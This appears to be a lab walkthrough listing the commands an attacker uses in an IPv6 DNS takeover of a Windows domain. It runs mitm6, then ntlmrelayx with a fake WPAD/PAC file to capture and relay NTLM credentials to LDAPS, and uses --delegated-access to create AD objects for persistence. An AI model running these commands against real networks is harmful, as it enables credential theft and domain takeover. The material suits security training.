## Attacker Commands

The following are the commands the attacker used while carrying out this attack:

### Domain Access, Positioning and DNS Takeover using mitm6

The attacker runs the mitm6 tool to send rogue ICMPv6 RAs with the aim of becoming the default IPv6 DNS server for the domain network.

Run the attack tool with the parameters: -i = Interface of attack machine that is conencted to the victim network i.e.eth1, -d = domain name of the victim clients' Windows domain i.e. mydomain.com

```
sudo mitm6 -i eth1 -d mydomain.com
```

### WPAD spoofing, Proxy abuse and NTLM credential theft

After successfully positioning itself as the victim’s IPv6 DNS server, the attacker proceeds to abuse the Web Proxy Auto-Discovery (WPAD) protocol.

The victim system attempts to locate a WPAD configuration file (**wpad.dat**) to automatically configure proxy settings. Since DNS resolution is now controlled by the attacker, the request for wpad is directed to the attacker-controlled machine, which responds with a *malicious Proxy Auto-Configuration (PAC) file*.

After the rogue IPv6 DNS server is set up, the next phase of the attack is WPAD protocol abuse. The client requests location of the wpad file from the new, rogue, DNSv6 server so that it can have internet access and the attacker send its a fake wpad file. 

This PAC file instructs the victim to use the attacker’s machine as its HTTP proxy.

As a result, all outbound web traffic is routed through the attacker. Instead of forwarding the traffic normally, the attacker responds with a `407 Proxy Authentication` Required message. Because proxy authentication is considered legitimate system behavior, Windows automatically responds with NTLM authentication credentials.

These credentials can then be captured or relayed to other services, enabling unauthorized access or further lateral movement within the network.

The command below runs the ntlmrelayx tool and does a couple of things due to the following parameters:
 - '-6' - Specify that we are target the IPv6 protocol
 - '-t' - The target to which we will relay the captured credentials
 - '-wh' - Hosts a malicious WPAD server and serves a fake PAC file. This causes victims to connect to the attacker as a proxy and initiate NTLM authentication.
 - '-l' - Specifies the directory where captured credentials and relayed session data will be stored.

 ```ntlmreplayx.py -6 -t ldaps://192.168.4.10 -wh fakewpad.mydomain.com -l lootme
 ```

 ### Review the stolen directory information

 Using the terminal, navigate to the *lootme* folder to view the files extracted.

```
cd /lootme
```

 ### Privilege escalation and Persistence

The attacker adds the `--delegated-access` flag to the ntlmrelayx command to allow him/her to create persistence in the environment as:

1. Create a computer object in AD if there's no further action by the users e.g. no reboots or interface restarts/reconnections.
2. Create a new user object in the AD domain in the event that an administrator logs into the computer whose credentials have been leaked, while mitm6 and ntlmrelayx are still running.

```
ntlmrelayx.py -6 -t ldaps://192.168.4.10 -wh fakewpad.mydomain.com --delegated-access
```